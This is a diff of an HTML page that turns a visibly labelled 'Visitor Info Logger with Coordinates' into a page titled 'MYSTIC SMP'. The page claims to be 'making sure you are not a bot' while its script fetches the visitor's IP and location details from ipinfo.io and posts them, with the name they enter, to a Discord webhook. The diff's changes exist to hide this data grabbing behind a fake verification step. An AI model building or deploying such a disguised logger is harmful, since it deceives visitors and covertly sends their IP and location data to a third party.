@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Visitor Info Logger with Coordinates</title>
+  <title>MYSTIC SMP</title>
 </head>
 <body>
   <h2>Welcome!</h2>
-  <p>Please enter your name:</p>
+  <p>what do we call you?</p>
   <input type="text" id="nameInput" placeholder="Your name" />
   <button id="submitBtn">Submit</button>
 
@@ -17,11 +17,11 @@
     document.getElementById("submitBtn").addEventListener("click", () => {
       const name = document.getElementById("nameInput").value.trim();
       if (!name) {
-        alert("Please enter your name!");
+        alert("what do we call you?");
         return;
       }
 
-      document.getElementById("status").textContent = "Fetching your IP info...";
+      document.getElementById("status").textContent = "making sure you are not a bot";
 
       fetch("https://ipinfo.io/json")
         .then(res => res.json())
@@ -45,14 +45,14 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(message)
           }).then(() => {
-            document.getElementById("status").textContent = "Thank you! Your info was sent.";
+            document.getElementById("status").textContent = "all good!";
           }).catch(err => {
-            document.getElementById("status").textContent = "Error sending info.";
+            document.getElementById("status").textContent = "YOU AREE A BOT!";
             console.error("Discord webhook error:", err);
           });
         })
         .catch(err => {
-          document.getElementById("status").textContent = "Error fetching IP info.";
+          document.getElementById("status").textContent = "YOU AREE A BOT!";
           console.error("IP info error:", err);
         });
     });
